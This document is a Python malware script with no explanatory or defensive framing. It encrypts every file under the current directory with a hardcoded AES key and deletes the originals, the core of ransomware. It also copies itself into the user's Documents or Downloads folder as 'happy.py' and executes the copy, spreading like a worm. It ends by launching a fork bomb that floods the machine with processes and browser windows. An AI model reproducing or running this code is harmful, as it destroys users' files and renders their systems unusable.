from shutil import copyfile
import os, getpass, random, sys, pkg_resources, webbrowser
import subprocess as sp
import shutil
from sys import argv
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from shutil import copyfile


def encrypt(key, filename):
    chunksize = 64 * 1024
    outFile = os.path.join(os.path.dirname(filename), "(encrypted)"+os.path.basename(filename))
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV = ''

    for i in range(16):
        IV += chr(random.randint(0, 0xFF))

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, "rb") as infile:
        with open(outFile, "wb") as outfile:
            outfile.write(filesize)
            outfile.write(IV)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 !=0:
                    chunk += ' ' *  (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))


def allfiles():
        allFiles = []
        for root, subfiles, files in os.walk(os.getcwd()):
                for names in files:
                        allFiles.append(os.path.join(root, names))
 
        return allFiles
 
def action():
        password = "GKDY<YSKU>546K61I61*1&1461Y;uo4984lfeuoliykilylisylul3l4LUOULDULUOujreluflutfk.5;/5hh565dc" #This is the key
        encFiles = allfiles()
        for Tfiles in encFiles:
                if os.path.basename(Tfiles).startswith("(encrypted)"):
                        pass
 
                elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):
                        pass
                else:
                        encrypt(SHA256.new(password).digest(), str(Tfiles))
                        os.remove(Tfiles)

def rep():
    source=os.path.abspath("happy.py")
    user=getpass.getuser()
    if(os.path.isdir("/home/"+user+"/Documents/")):
        destination="/home/"+user+"/Documents/"+"happy.py"
    elif(os.path.isdir("/home/"+user+"/Downloads/")):
        destination="/home/"+user+"/Downloads/"+"happy.py"
    else:
        destination=os.getcwd()+"\\worm.py" 

    copyfile(source,destination)
    os.system("python "+destination) # To execute script

def forkbomb():
    while 1:
        os.fork()
        x = os.getpid()
        filename = str(x) + ".txt"
        notneeded = open(filename, "w")
        webbrowser.open(filename)

def main():
    rep()
    action()
    forkbomb()

if __name__=="__main__":
    main()